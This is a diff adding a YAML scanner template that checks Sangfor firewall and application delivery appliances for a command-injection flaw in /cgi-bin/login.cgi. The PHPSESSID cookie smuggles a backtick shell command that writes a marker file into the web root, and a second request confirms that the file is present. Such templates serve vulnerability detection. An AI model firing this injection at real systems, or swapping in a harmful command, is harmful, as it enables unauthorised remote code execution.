@@ -1,0 +1,20 @@
+name: 深信服-防火墙-深信服-应用交付管理系统-命令执行
+description: >-
+  代码执行
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /cgi-bin/login.cgi
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      Cookie: "PHPSESSID=`$(echo Rscan_test > /fwlib/sys/virus/webui/svpn_html/Rscan.txt)`;"
+    body: >-
+      {"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "EINW" , "privacy_enable": "0"}}
+    expression:
+      status: 200
+  - method: GET
+    path: /svpn_html/Rscan.txt
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
